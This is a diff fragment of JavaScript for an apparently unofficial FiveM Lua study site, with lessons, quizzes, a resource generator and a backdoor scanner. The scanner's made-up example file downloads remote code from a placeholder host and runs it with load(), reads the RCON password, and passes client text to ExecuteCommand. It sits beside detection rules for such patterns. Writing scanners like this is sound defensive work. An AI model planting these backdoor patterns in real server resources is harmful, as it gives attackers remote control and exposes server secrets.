+      var ta = document.createElement('textarea'); ta.value = text; ta.setAttribute('readonly', ''); ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand('copy'); ok(); } catch (e) { toast('Copy failed. Select the code and copy it by hand.'); }
+      document.body.removeChild(ta);
+    };
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(ok, fallback);
+      else fallback();
+    } catch (e) { fallback(); }
+  }
+  document.addEventListener('click', function (e) {
+    var b = e.target.closest('[data-copy]');
+    if (b) copyText(codeStore[+b.getAttribute('data-copy')], b);
+  });
+
+  var toastTimer;
+  function toast(msg) { var t = $('#toast'); t.textContent = msg; t.hidden = false; clearTimeout(toastTimer); toastTimer = setTimeout(function () { t.hidden = true; }, 2600); }
+
+  // ---------- rail ----------
+  function renderSide(route) {
+    var n = doneCount();
+    var lessonLinks = LESSONS.map(function (l, i) {
+      var active = route.view === 'lesson' && route.id === l.id;
+      return '<a class="nav-link' + (active ? ' active' : '') + (progress.done[l.id] ? ' done' : '') + '" href="#lesson-' + l.id + '"' + (active ? ' aria-current="page"' : '') + '>' +
+        '<span class="n">' + pad(i + 1) + '</span><span>' + esc(l.title) + '</span><span class="st" title="' + (progress.done[l.id] ? 'Quiz passed' : 'Not passed yet') + '"></span></a>';
+    }).join('');
+    var tool = function (hash, label, view) {
+      var on = route.view === view;
+      return '<a class="nav-link' + (on ? ' active' : '') + '" href="#' + hash + '"' + (on ? ' aria-current="page"' : '') + '><span class="n">&gt;</span><span>' + label + '</span><span></span></a>';
+    };
+    $('#side').innerHTML =
+      '<a class="wordmark" href="#home"><b>FiveM Script Garage</b><span>resources/[local]/script_garage</span></a>' +
+      '<div class="meter"><div class="meter-row"><span>Lessons passed</span><b>' + n + ' / ' + TOTAL + '</b></div>' +
+      '<div class="ticks" style="grid-template-columns:repeat(' + TOTAL + ',1fr)">' + ticks() + '</div></div>' +
+      '<nav class="nav" aria-label="Start">' + tool('home', 'Overview', 'home') + '</nav>' +
+      '<nav class="nav" aria-label="Lessons"><p class="nav-label">lessons</p>' + lessonLinks + '</nav>' +
+      '<nav class="nav" aria-label="Tools"><p class="nav-label">tools</p>' +
+        tool('generator', 'Resource generator', 'generator') +
+        tool('natives', 'Native cheat sheet', 'natives') +
+        tool('security', 'Backdoor scanner', 'security') + '</nav>' +
+      '<div class="rail-foot"><div id="appSlot"></div><p>Unofficial study guide built from docs.fivem.net. Progress is saved on this device. Use a progress code on the overview page to move it.</p></div>';
+    if (window.GARAGE_APP) window.GARAGE_APP.rail($('#appSlot'));
+    $('#miniCount').textContent = n + '/' + TOTAL;
+    var mt = $('#miniTicks'); mt.style.gridTemplateColumns = 'repeat(' + TOTAL + ',1fr)'; mt.innerHTML = ticks();
+  }
+
+  // ---------- home ----------
+  function renderHome() {
+    var n = doneCount(), next = nextLesson();
+    var nextIdx = next ? LESSONS.indexOf(next) + 1 : 0;
+    var consoleLines = [
+      '<span class="pr">&gt;</span> ensure script_garage',
+      '<span class="tg">[script_garage]</span> ' + n + ' of ' + TOTAL + ' lessons passed',
+      next ? '<span class="tg">[script_garage]</span> next: lesson ' + pad(nextIdx) + ', ' + esc(next.title) + ' (' + next.mins + ' min)'
+           : '<span class="tg">[script_garage]</span> all quizzes passed'
+    ].join('\n');
+    var actions = next
+      ? '<a class="btn primary" href="#lesson-' + next.id + '">Open lesson ' + nextIdx + ': ' + esc(next.title) + '</a><a class="btn" href="#generator">Open resource generator</a>'
+      : '<a class="btn primary" href="#generator">Open resource generator</a><a class="btn" href="#natives">Open native cheat sheet</a>';
+    var rows = LESSONS.map(function (l, i) {
+      var d = progress.done[l.id];
+      return '<tr><td class="n">' + pad(i + 1) + '</td><td class="t"><a href="#lesson-' + l.id + '">' + esc(l.title) + '</a></td>' +
+        '<td class="g">' + esc(l.group) + '</td><td class="m">' + l.mins + ' min</td>' +
+        '<td><span class="st-text' + (d ? ' ok' : '') + '">' + (d ? 'passed' : 'not passed') + '</span></td></tr>';
+    }).join('');
+    return '<div class="col">' +
+      '<header class="page-head"><p class="crumb">overview</p><h1>FiveM Script Garage</h1>' +
+      '<p class="lead">Fourteen lessons that follow the Cfx.re scripting manual in order. Each one has Lua you can paste into your own server, a task to try in game, and a quiz. Pass the quiz to mark the lesson done.</p></header>' +
+      '<div class="block"><div class="console"><div class="console-bar"><span>server console</span><span>this browser</span></div><pre>' + consoleLines + '</pre></div>' +
+      '<div class="actions">' + actions + '</div></div>' +
+      '<section class="block"><h2 class="h">Lessons</h2><div style="overflow-x:auto"><table class="list"><thead><tr><th>#</th><th>Lesson</th><th class="g">Docs section</th><th class="m">Reading</th><th>Quiz</th></tr></thead><tbody>' + rows + '</tbody></table></div></section>' +
+      '<section class="block"><h2 class="h">Tools</h2><div class="tools">' +
+        '<a class="tool-row" href="#generator"><b>Resource generator</b><span>Name a resource, pick its features, and get every file plus the server.cfg line.</span></a>' +
+        '<a class="tool-row" href="#natives"><b>Native cheat sheet</b><span>' + DATA.natives.length + ' natives and runtime functions RP scripts use most, tagged client, server or both.</span></a>' +
+        '<a class="tool-row" href="#security"><b>Backdoor scanner</b><span>Paste a script from a downloaded resource and see which lines look like a backdoor. Part of the security lesson.</span></a>' +
+      '</div></section>' +
+      '<section class="block"><h2 class="h">Where code runs</h2><div class="where">' +
+        '<span class="tag">client</span><span>Runs on each player\'s PC. Players can read and change it, so it never decides money or items.</span>' +
+        '<span class="tag">server</span><span>Runs on your server. It checks everything the client sends.</span>' +
+        '<span class="tag">shared</span><span>Loaded on both sides, usually <code>config.lua</code>.</span>' +
+        '<span class="tag">manifest</span><span><code>fxmanifest.lua</code>, which tells FiveM what to load.</span>' +
+        '<span class="tag">nui</span><span>HTML, CSS and JavaScript for in-game menus.</span>' +
+      '</div></section>' +
+      '<section class="block" id="progress-code"><h2 class="h">Move your progress</h2>' +
+      '<p class="lead" style="font-size:0.95rem">Progress is saved on this device. To continue on another phone, PC or browser, copy this code there and load it. Loading adds the passed lessons and done tasks in the code to the ones already here; it never removes any.</p>' +
+      '<div class="code-row"><input class="input mono" id="pcOut" readonly value="' + progressCode() + '" aria-label="Your progress code"><button class="btn" id="pcCopy">Copy progress code</button></div>' +
+      '<div class="code-row"><input class="input mono" id="pcIn" placeholder="Paste a progress code" aria-label="Progress code to load" autocomplete="off" spellcheck="false"><button class="btn" id="pcLoad">Load code</button></div>' +
+      '<p class="hint" id="pcMsg" role="status"></p></section></div>';
+  }
+
+  // ---------- progress code: lesson order as bits, "FXSG1-<passed>-<tasks>" in hex ----------
+  function progressCode() {
+    var d = 0, t = 0;
+    LESSONS.forEach(function (l, i) { if (progress.done[l.id]) d |= 1 << i; if (progress.tasks[l.id]) t |= 1 << i; });
+    return 'FXSG1-' + d.toString(16) + '-' + t.toString(16);
+  }
+  function loadProgressCode(text) {
+    var m = String(text).trim().match(/^FXSG1-([0-9a-f]{1,4})-([0-9a-f]{1,4})$/i);
+    var max = (1 << TOTAL) - 1;
+    if (!m) return { ok: false, msg: 'That is not a progress code. It looks like FXSG1-1f-3, copied from this page on another device.' };
+    var d = parseInt(m[1], 16), t = parseInt(m[2], 16);
+    if (d > max || t > max) return { ok: false, msg: 'That code has more lessons than this course. Check it was copied in full.' };
+    var newDone = 0, newTasks = 0;
+    LESSONS.forEach(function (l, i) {
+      if (d & (1 << i) && !progress.done[l.id]) { progress.done[l.id] = true; newDone++; }
+      if (t & (1 << i) && !progress.tasks[l.id]) { progress.tasks[l.id] = true; newTasks++; }
+    });
+    save();
+    if (!newDone && !newTasks) return { ok: true, msg: 'Code loaded. Everything in it was already on this device.' };
+    return { ok: true, msg: 'Code loaded: ' + newDone + ' more lesson' + (newDone === 1 ? '' : 's') + ' passed and ' + newTasks + ' more task' + (newTasks === 1 ? '' : 's') + ' done.' };
+  }
+  function bindHome() {
+    $('#pcCopy').addEventListener('click', function (e) { copyText($('#pcOut').value, e.currentTarget); });
+    $('#pcOut').addEventListener('focus', function (e) { e.target.select(); });
+    var load = function () {
+      var r = loadProgressCode($('#pcIn').value);
+      if (r.ok) { render(); var sec = $('#progress-code'); if (sec) sec.scrollIntoView(); }
+      var msg = $('#pcMsg'); msg.textContent = r.msg; msg.className = 'hint' + (r.ok ? ' ok' : ' err');
+    };
+    $('#pcLoad').addEventListener('click', load);
+    $('#pcIn').addEventListener('keydown', function (e) { if (e.key === 'Enter') load(); });
+  }
+
+  // ---------- lessons ----------
+  var quizState = {};
+  function shuffle(n) { var a = []; for (var i = 0; i < n; i++) a.push(i); for (var j = a.length - 1; j > 0; j--) { var k = Math.floor(Math.random() * (j + 1)); var t = a[j]; a[j] = a[k]; a[k] = t; } return a; }
+  function freshQuiz(L) { return { order: L.quiz.map(function (q) { return shuffle(q.opts.length); }), picks: {}, checked: false }; }
+
+  function quizHtml(L) {
+    var st = quizState[L.id] || (quizState[L.id] = freshQuiz(L));
+    var qs = L.quiz.map(function (q, qi) {
+      var opts = st.order[qi].map(function (oi) {
+        var cls = 'opt';
+        if (st.picks[qi] === oi) cls += ' picked';
+        if (st.checked) { if (oi === q.answer && st.picks[qi] === oi) cls += ' right'; else if (st.picks[qi] === oi) cls += ' wrong'; }
+        return '<label class="' + cls + '"><input type="radio" name="q-' + L.id + '-' + qi + '" id="q-' + L.id + '-' + qi + '-' + oi + '" value="' + oi + '" data-q="' + qi + '"' +
+          (st.picks[qi] === oi ? ' checked' : '') + (st.checked ? ' disabled' : '') + '><span>' + q.opts[oi] + '</span></label>';
+      }).join('');
+      var why = '';
+      if (st.checked) {
+        var right = st.picks[qi] === q.answer;
+        why = '<p class="why' + (right ? '' : ' no') + '"><b>' + (right ? 'correct' : 'wrong') + '</b>' + q.why + '</p>';
+      }
+      return '<div class="q"><div class="q-text"><span class="n">Q' + (qi + 1) + '</span><span>' + q.q + '</span></div><div class="opts">' + opts + '</div>' + why + '</div>';
+    }).join('');
+    var foot;
+    if (!st.checked) {
+      var all = L.quiz.every(function (q, qi) { return st.picks[qi] !== undefined; });
+      foot = '<button class="btn primary" data-act="check"' + (all ? '' : ' disabled') + '>Check answers</button><span class="count">' + Object.keys(st.picks).length + ' of ' + L.quiz.length + ' answered</span>';
+    } else {
+      var score = L.quiz.filter(function (q, qi) { return st.picks[qi] === q.answer; }).length;
+      var pass = score === L.quiz.length;
+      foot = '<span class="quiz-result ' + (pass ? 'pass' : 'fail') + '">' + score + ' / ' + L.quiz.length + ' correct. ' + (pass ? 'Lesson marked done.' : 'Read the explanations and try again.') + '</span>' +
+        '<button class="btn small" data-act="retry">' + (pass ? 'Take the quiz again' : 'Retry quiz') + '</button>';
+    }
+    return '<section class="block" id="quiz"><div class="quiz-head"><h2 class="h">Quiz</h2>' +
+      '<span class="count">' + (progress.done[L.id] ? 'passed' : L.quiz.length + ' questions, all must be right to mark the lesson done') + '</span></div>' +
+      qs + '<div class="quiz-foot">' + foot + '</div></section>';
+  }
+
+  function renderLesson(L) {
+    var i = LESSONS.indexOf(L);
+    var prev = LESSONS[i - 1], next = LESSONS[i + 1];
+    var secs = L.sections.map(function (s) {
+      return '<section class="section"><h2>' + esc(s.title) + '</h2><div class="prose">' + parts(s.parts) + '</div></section>';
+    }).join('');
+    if (L.id === 'security') secs += scannerHtml();
+    var deeper = L.deeper.length ? '<section class="block"><h2 class="h">Go deeper</h2><div class="deeper-list">' + L.deeper.map(function (d) {
+      return '<details class="deeper"><summary>' + esc(d.title) + '</summary><div class="prose">' + parts(d.parts) + '</div></details>';
+    }).join('') + '</div></section>' : '';
+    var fw = L.framework ? '<aside class="box"><div class="box-head"><span class="label">framework notes</span><h2>QBCore and ESX</h2></div><div class="box-body prose">' + parts(L.framework) + '</div></aside>' : '';
+    var task = '<section class="box"><div class="box-head"><span class="label">try it in game</span><h2>' + esc(L.task.title) + '</h2></div>' +
+      '<div class="box-body prose">' + parts(L.task.parts) + '</div>' +
+      '<div class="box-foot"><label class="check"><input type="checkbox" id="task-' + L.id + '" data-task="' + L.id + '"' + (progress.tasks[L.id] ? ' checked' : '') + '> Mark task done on my server</label></div></section>';
+    var docs = '<section class="block"><h2 class="h">Sources</h2><ul class="sources">' +
+      L.docs.map(function (d) { return '<li><a href="' + esc(d.url) + '" target="_blank" rel="noopener">' + esc(d.label) + '</a> <span class="count">' + esc(d.url.replace(/^https?:\/\//, '').split('/')[0]) + '</span></li>'; }).join('') + '</ul></section>';
+    var pager = '<nav class="pager" aria-label="Lesson pages">' +
+      (prev ? '<a href="#lesson-' + prev.id + '"><small>previous lesson</small>' + esc(prev.title) + '</a>' : '') +
+      (next ? '<a class="next" href="#lesson-' + next.id + '"><small>next lesson</small>' + esc(next.title) + '</a>' : '<a class="next" href="#generator"><small>next</small>Resource generator</a>') + '</nav>';
+    return '<article class="col">' +
+      '<header class="page-head"><p class="crumb"><a href="#home">lessons</a> / ' + pad(i + 1) + ' of ' + TOTAL + ' / ' + esc(L.group) + '</p><h1>' + esc(L.title) + '</h1>' +
+      '<p class="lead">' + L.summary + '</p><div class="meta"><span>' + L.mins + ' min read</span>' +
+      (progress.done[L.id] ? '<span class="ok">quiz passed</span>' : '<span>quiz not passed</span>') +
+      '<a href="' + esc(L.docs[0].url) + '" target="_blank" rel="noopener">official doc page</a></div></header>' +
+      secs + deeper + fw + task +
+      '<div id="quizMount">' + quizHtml(L) + '</div>' + docs + pager + '</article>';
+  }
+
+  function bindLesson(L) {
+    var mount = $('#quizMount');
+    mount.addEventListener('change', function (e) {
+      var inp = e.target; if (!inp.matches('input[type=radio]')) return;
+      var st = quizState[L.id]; st.picks[+inp.getAttribute('data-q')] = +inp.value;
+      mount.innerHTML = quizHtml(L);
+      var again = document.getElementById(inp.id); if (again) again.focus();
+    });
+    mount.addEventListener('click', function (e) {
+      var b = e.target.closest('[data-act]'); if (!b) return;
+      var st = quizState[L.id];
+      if (b.getAttribute('data-act') === 'check') {
+        st.checked = true;
+        var pass = L.quiz.every(function (q, qi) { return st.picks[qi] === q.answer; });
+        if (pass && !progress.done[L.id]) { progress.done[L.id] = true; save(); toast('Lesson passed: ' + L.title); renderSide(current); }
+        mount.innerHTML = quizHtml(L);
+      } else {
+        quizState[L.id] = freshQuiz(L);
+        mount.innerHTML = quizHtml(L);
+      }
+    });
+    var tb = document.querySelector('[data-task]');
+    if (tb) tb.addEventListener('change', function () { progress.tasks[L.id] = tb.checked; save(); });
+    if (L.id === 'security') bindScanner();
+  }
+
+  // ---------- backdoor scanner ----------
+  var SAMPLE = [
+    '-- Example: part of a "free" resource found online',
+    'local cfg = { webhook = "https://discord.com/api/webhooks/000/xyz" }',
+    '',
+    'PerformHttpRequest("https://example.invalid/update", function(status, body)',
+    '    if body then',
+    '        assert(load(body))()',
+    '    end',
+    'end, "GET")',
+    '',
+    'local _0x1a2b = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64"',
+    'local key = GetConvar("rcon_password", "")',
+    '',
+    'RegisterNetEvent("helpme:run", function(cmd)',
+    '    ExecuteCommand(cmd)',
+    'end)'
+  ].join('\n');
+  var RULES = [
+    { re: /(?<![.:\w])load(?:string)?\s*\(/, sev: 'high', why: 'Runs a text string as Lua code. Fine in rare tools, but in a downloaded resource it is the classic way to execute hidden or downloaded code.' },
+    { re: /\beval\s*\(|new\s+Function\s*\(/, sev: 'high', why: 'JavaScript that runs a string as code (eval / new Function).' },
+    { re: /child_process|os\.execute|io\.popen/, sev: 'high', why: 'Runs operating-system commands on your server machine.' },
+    { re: /add_principal|add_ace/, sev: 'high', why: 'Grants permissions from code. Permissions belong in server.cfg, not hidden inside a script.' },
+    { re: /GetConvar\s*\(\s*["'](?:rcon_password|sv_licenseKey|mysql_connection_string|steam_webApiKey)/i, sev: 'high', why: 'Reads a secret (RCON password, license key, database connection). Check it is not sent anywhere.' },
+    { re: /(?:\\x[0-9a-fA-F]{2}){6,}/, sev: 'medium', why: 'A run of \\x hex escapes: text hidden so you cannot read it. Common in obfuscated backdoors.' },
+    { re: /(?:\\\d{2,3}){8,}/, sev: 'medium', why: 'A run of decimal escapes (\\80\\101...): hidden text.' },
+    { re: /string\.char\s*\(\s*\d+(?:\s*,\s*\d+){7,}/, sev: 'medium', why: 'string.char with many numbers builds hidden text at runtime.' },
+    { re: /\b_0x[0-9a-fA-F]{3,}\b/, sev: 'medium', why: 'Variable names like _0x1a2b are produced by obfuscators.' },
+    { re: /[A-Za-z0-9+\/]{160,}={0,2}/, sev: 'medium', why: 'A very long base64-looking blob. Could be an image, or could be packed code.' },
+    { re: /discord(?:app)?\.com\/api\/webhooks/, sev: 'medium', why: 'Sends data to a Discord webhook. Normal for logs, but check exactly what is sent.' },
+    { re: /\b_G\s*\[/, sev: 'medium', why: 'Looks up globals by computed name, which hides which functions are called.' },
+    { re: /PerformHttpRequest/, sev: 'info', why: 'Makes a web request. Fine for version checks and logs; make sure nothing it downloads is executed.' },
+    { re: /ExecuteCommand\s*\(/, sev: 'info', why: 'Runs a console command. Make sure the command text never comes from a client event.' }
+  ];
+  function scan(text) {
+    var out = [];
+    var lines = text.split('\n');
+    lines.forEach(function (line, i) {
+      if (line.length > 600) out.push({ line: i + 1, sev: 'medium', why: 'Extremely long line (' + line.length + ' characters). Real code is rarely written on one line; obfuscated code often is.', snip: line.slice(0, 80) });
+      RULES.forEach(function (r) { if (r.re.test(line)) out.push({ line: i + 1, sev: r.sev, why: r.why, snip: line.trim().slice(0, 120) }); });
+    });
+    if (/PerformHttpRequest/.test(text) && /(?<![.:\w])load(?:string)?\s*\(/.test(text)) {
+      out.unshift({ line: 0, sev: 'high', why: 'This file both downloads with PerformHttpRequest and executes strings with load(). Together that is the signature of remote code execution: treat it as a backdoor until you have read every line.', snip: '' });
+    }
+    if (/RegisterNetEvent/.test(text) && /ExecuteCommand\s*\(/.test(text)) {
+      out.push({ line: 0, sev: 'medium', why: 'Has network events and ExecuteCommand in the same file. Check that no client can pass a command string through an event.', snip: '' });
+    }
+    var rank = { high: 0, medium: 1, info: 2 };
+    return out.sort(function (a, b) { return rank[a.sev] - rank[b.sev] || a.line - b.line; });
+  }
+  function scanResultsHtml(text) {
+    if (!text.trim()) return '<p class="hint" style="padding:10px 0">Paste a .lua or .js file above, then press Scan file.</p>';
+    var f = scan(text);
+    if (!f.length) return '<p class="clean">No red flags found by these checks. That does not prove the file is safe, but nothing obvious stood out.</p>';
+    var counts = { high: 0, medium: 0, info: 0 }; f.forEach(function (x) { counts[x.sev]++; });
+    return '<p class="count" style="padding-bottom:6px;border-bottom:1px solid var(--line)">' + counts.high + ' high, ' + counts.medium + ' medium, ' + counts.info + ' info</p>' + f.map(function (x) {
+      return '<div class="finding"><span class="sev ' + x.sev + '">' + x.sev + '</span><div><p>' + esc(x.why) + '</p>' +
+        (x.line ? '<p class="hint">line ' + x.line + (x.snip ? ': <code>' + esc(x.snip) + '</code>' : '') + '</p>' : '<p class="hint">whole file</p>') + '</div></div>';
+    }).join('');
+  }
+  function scannerHtml() {
+    return '<section class="section" id="scanner"><h2>Backdoor scanner</h2>' +
+      '<p class="lead" style="font-size:0.95rem">Paste a script file from a resource you downloaded. The check runs in your browser and nothing is uploaded. The file loaded below is a made-up example so you can see what gets flagged.</p>' +
+      '<div class="editor"><div class="editor-bar"><div class="etabs"><span class="etab on">suspect.lua</span></div><div class="editor-tools"><span class="tag">paste here</span></div></div>' +
+      '<label for="scanInput" class="label" style="position:absolute;left:-9999px">Code to scan</label><textarea class="input" id="scanInput" rows="13" spellcheck="false"></textarea></div>' +
+      '<div class="actions"><button class="btn primary" id="scanBtn">Scan file</button><button class="btn" id="scanSample">Load example file</button><button class="btn" id="scanClear">Clear</button></div>' +
+      '<div class="scan-results" id="scanOut"></div></section>';
+  }
+  function bindScanner() {
+    var ta = $('#scanInput'), out = $('#scanOut');
+    ta.value = SAMPLE;
+    var run = function () { out.innerHTML = scanResultsHtml(ta.value); };
+    run();
+    $('#scanBtn').addEventListener('click', run);
+    $('#scanSample').addEventListener('click', function () { ta.value = SAMPLE; run(); });
+    $('#scanClear').addEventListener('click', function () { ta.value = ''; run(); ta.focus(); });
+  }
+
+  // ---------- generator ----------
+  var genState = { name: 'coffee_shop', author: '', description: 'A shop counter with a menu', config: true, nui: true, cooldown: true, marker: true, tab: 0 };
+  try { var gs = JSON.parse(localStorage.getItem(STORE_KEY + '-gen') || 'null'); if (gs && typeof gs.name === 'string') { for (var k in gs) genState[k] = gs[k]; } } catch (e) {}
+  function validName(n) { return /^[a-z][a-z0-9_-]{1,31}$/.test(n); }
+  function renderGenerator() {
+    var opt = function (key, title, desc) {
+      return '<label class="opt-toggle"><input type="checkbox" id="g-' + key + '" data-g="' + key + '"' + (genState[key] ? ' checked' : '') + '><b>' + title + '</b><span>' + desc + '</span></label>';
+    };
+    return '<div class="col wide"><header class="page-head"><p class="crumb">tools / generator</p><h1>Resource generator</h1>' +
+      '<p class="lead">Type a name and pick the features your resource needs. Copy each file into <code>resources/[local]/yourname/</code>. The code follows the patterns from the lessons, with the checks on the server side.</p></header>' +
+      '<div class="gen"><div class="form">' +
+      '<div class="field"><label for="g-name">Resource name</label><input class="input mono" id="g-name" value="' + esc(genState.name) + '" autocomplete="off" spellcheck="false"><p class="hint" id="g-name-hint">Lowercase letters, numbers, _ or -. Becomes the folder name and event prefix.</p></div>' +
+      '<div class="field"><label for="g-author">Author</label><input class="input" id="g-author" value="' + esc(genState.author) + '" placeholder="Your name"></div>' +
+      '<div class="field"><label for="g-description">Description</label><input class="input" id="g-description" value="' + esc(genState.description) + '"></div>' +
+      '<div class="field"><span class="lbl">Features</span><div class="opt-list">' +
+      opt('config', 'Shared config', 'A config.lua loaded on client and server, so positions and prices live in one place.') +
+      opt('nui', 'NUI menu', 'An HTML menu with buttons. Clicks are sent to the server as an option ID only.') +
+      opt('cooldown', 'Server-side cooldown', 'The server refuses repeat uses within N seconds, per player.') +
+      opt('marker', 'Marker with "press E"', 'A marker at a location; press E nearby to use it. The server re-checks distance.') +
+      '</div></div></div><div class="out" id="genOut"></div></div></div>';
+  }
+  var genStoreBase = 0;
+  function renderGenOut() {
+    var ok = validName(genState.name);
+    var nameInp = $('#g-name'), hint = $('#g-name-hint');
+    nameInp.classList.toggle('invalid', !ok);
+    hint.classList.toggle('err', !ok);
+    hint.textContent = ok ? 'Lowercase letters, numbers, _ or -. Becomes the folder name and event prefix.' : 'Use 2 to 32 characters: start with a lowercase letter, then lowercase letters, numbers, _ or -.';
+    var out = $('#genOut');
+    if (!ok) { out.innerHTML = '<div class="empty">Fix the resource name to see your files.</div>'; return; }
+    try { localStorage.setItem(STORE_KEY + '-gen', JSON.stringify(genState)); } catch (e) {}
+    codeStore.length = genStoreBase; // drop copy buffers from the previous render
+    var r = generateResource(genState);
+    if (genState.tab >= r.files.length) genState.tab = 0;
+    var f = r.files[genState.tab];
+    var tabs = r.files.map(function (file, i) {
+      var on = i === genState.tab;
+      return '<button class="etab' + (on ? ' on' : '') + '" data-tab="' + i + '" role="tab" aria-selected="' + on + '">' + esc(file.path) + '</button>';
+    }).join('');
+    var allText = r.files.map(function (file) {
+      var label = '===== ' + genState.name + '/' + file.path + ' =====';
+      var head = file.lang === 'html' ? '<!-- ' + label + ' -->' : file.lang === 'css' ? '/* ' + label + ' */' : file.lang === 'js' ? '// ' + label : '-- ' + label;
+      return head + '\n' + file.content;
+    }).join('\n');
+    var allId = codeStore.push(allText) - 1;
+    var how = [
+      'Create the folder <code>resources/[local]/' + esc(genState.name) + '</code> on your server.',
+      'Create each file below with the same name and paste its contents (' + r.files.length + ' files' + (genState.nui ? ', including the <code>html</code> folder' : '') + ').',
+      'Add the line to <code>server.cfg</code>, then run <code>refresh; ensure ' + esc(genState.name) + '</code> in the server console.',
+      genState.marker ? 'In game, stand where you want the marker, run <code>/' + esc(genState.name) + '_coords</code>, and paste the result into ' + (genState.config ? '<code>config.lua</code>' : 'both <code>client.lua</code> and <code>server.lua</code>') + '.' : 'In game, type <code>/' + esc(genState.name) + '</code> to use it.',
+      'Open the F8 console and run <code>resmon 1</code> to check the resource\'s CPU time.'
+    ];
+    out.innerHTML =
+      '<div class="out-head"><p class="path">resources/[local]/<b>' + esc(genState.name) + '</b>/ <span class="count">' + r.files.length + ' files</span></p>' +
+      '<button class="btn small" data-copy="' + allId + '">Copy all ' + r.files.length + ' files</button></div>' +
+      codeBlock(f.content, f.lang, f.path, { tabs: tabs }) +
+      '<div class="split">' + codeBlock(r.tree, 'text', 'folder layout') +
+      '<div style="display:flex;flex-direction:column;gap:14px;min-width:0">' + codeBlock(r.cfg, 'cfg', 'server.cfg', { gutter: false }) +
+      '<div class="block" style="gap:8px"><h2 class="h" style="font-size:1.05rem">Install</h2><ol class="steps">' + how.map(function (s) { return '<li>' + s + '</li>'; }).join('') + '</ol></div></div></div>';
+    // keep the open file's tab visible when the strip is scrolled
+    var onTab = out.querySelector('.etab.on');
+    if (onTab) { var strip = onTab.parentNode; if (onTab.offsetLeft + onTab.offsetWidth > strip.scrollLeft + strip.clientWidth || onTab.offsetLeft < strip.scrollLeft) strip.scrollLeft = Math.max(0, onTab.offsetLeft - 24); }
+  }
+  function bindGenerator() {
+    genStoreBase = codeStore.length;
+    ['name', 'author', 'description'].forEach(function (k) {
+      $('#g-' + k).addEventListener('input', function (e) { genState[k] = k === 'name' ? e.target.value.trim() : e.target.value; renderGenOut(); });
+    });
+    document.querySelectorAll('[data-g]').forEach(function (cb) {
+      cb.addEventListener('change', function () { genState[cb.getAttribute('data-g')] = cb.checked; renderGenOut(); });
+    });
+    $('#genOut').addEventListener('click', function (e) {
+      var t = e.target.closest('[data-tab]'); if (!t) return;
+      genState.tab = +t.getAttribute('data-tab'); renderGenOut();
+      var again = document.querySelector('[data-tab="' + genState.tab + '"]'); if (again) again.focus();
+    });
+    renderGenOut();
+  }
+
+  // ---------- cheat sheet ----------
+  var natState = { q: '', side: 'all', cat: 'all' };
+  var CATS = []; DATA.natives.forEach(function (n) { if (CATS.indexOf(n.c) < 0) CATS.push(n.c); });
+  function renderNatives() {
+    var seg = [['all', 'all'], ['client', 'client'], ['server', 'server'], ['both', 'both']].map(function (s) {
+      return '<button data-side="' + s[0] + '" class="' + (natState.side === s[0] ? 'on' : '') + '" aria-pressed="' + (natState.side === s[0]) + '">' + s[1] + '</button>';
+    }).join('');
+    return '<div class="col wide"><header class="page-head"><p class="crumb">tools / natives</p><h1>Native cheat sheet</h1>' +
+      '<p class="lead">The natives and runtime functions RP scripts use most. Names link to the official Native Reference. Where a native exists on both sides with different arguments, both signatures are shown.</p></header>' +
+      '<div class="filters"><input class="input" id="natQ" type="search" placeholder="Search: vehicle, blip, coords, event" value="' + esc(natState.q) + '" aria-label="Search natives">' +
+      '<div class="seg" role="group" aria-label="Filter by side">' + seg + '</div>' +
+      '<select class="input" id="natCat" aria-label="Filter by category"><option value="all">All categories</option>' + CATS.map(function (c) { return '<option' + (natState.cat === c ? ' selected' : '') + '>' + esc(c) + '</option>'; }).join('') + '</select></div>' +
+      '<div id="natOut"></div></div>';
+  }
+  function renderNatOut() {
+    var q = natState.q.toLowerCase().trim();
+    var rows = DATA.natives.filter(function (n) {
+      if (natState.side !== 'all' && n.s !== natState.side) return false;
+      if (natState.cat !== 'all' && n.c !== natState.cat) return false;
+      if (!q) return true;
+      return (n.n + ' ' + n.c + ' ' + n.d + ' ' + (n.up || '')).toLowerCase().indexOf(q) >= 0;
+    });
+    var body = rows.map(function (n) {
+      var sig = '';
+      if (n.sig) {
+        var keys = Object.keys(n.sig);
+        sig = keys.map(function (k) { return '<span class="sig">' + (keys.length > 1 ? '<b>' + k + ':</b> ' : '') + esc(n.sig[k]) + '</span>'; }).join('');
+      }
+      return '<tr><td><span class="nat-name"><a href="' + esc(n.u) + '" target="_blank" rel="noopener">' + esc(n.n) + '</a></span>' + (n.rt ? '<span class="rt">Lua runtime function</span>' : '') + '</td>' +
+        '<td><span class="tag">' + n.s + '</span></td><td class="cat">' + esc(n.c) + '</td>' +
+        '<td>' + esc(n.d) + sig + '</td><td><span class="ex">' + esc(n.e) + '</span></td></tr>';
+    }).join('');
+    $('#natOut').innerHTML = '<p class="count" style="margin:0 0 8px">' + rows.length + ' of ' + DATA.natives.length + ' shown</p>' +
+      (rows.length ? '<div class="table-wrap"><table class="nat-table"><thead><tr><th>Name</th><th>Side</th><th>Category</th><th>What it does</th><th>Example</th></tr></thead><tbody>' + body + '</tbody></table></div>'
+        : '<div class="empty">Nothing matches. Try a shorter word, or set the side filter back to all.</div>');
+  }
+  function bindNatives() {
+    $('#natQ').addEventListener('input', function (e) { natState.q = e.target.value; renderNatOut(); });
+    $('#natCat').addEventListener('change', function (e) { natState.cat = e.target.value; renderNatOut(); });
+    document.querySelectorAll('[data-side]').forEach(function (b) {
+      b.addEventListener('click', function () {
+        natState.side = b.getAttribute('data-side');
+        document.querySelectorAll('[data-side]').forEach(function (x) { x.classList.toggle('on', x === b); x.setAttribute('aria-pressed', String(x === b)); });
+        renderNatOut();
+      });
+    });
+    renderNatOut();
+  }
+
+  // ---------- router ----------
+  var current = { view: 'home' };
+  function parseRoute() {
+    var h = (location.hash || '').replace(/^#/, '');
+    if (h.indexOf('lesson-') === 0) { var id = h.slice(7); if (LESSONS.some(function (l) { return l.id === id; })) return { view: 'lesson', id: id }; }
+    if (h === 'security') return { view: 'security', id: 'security' };
+    if (h === 'generator' || h === 'natives') return { view: h };
+    return { view: 'home' };
+  }
+  function render() {
+    current = parseRoute();
+    codeStore = [];
+    var main = $('#main');
+    var lessonId = current.view === 'lesson' || current.view === 'security' ? current.id : null;
+    renderSide({ view: current.view, id: lessonId });
+    if (lessonId) {
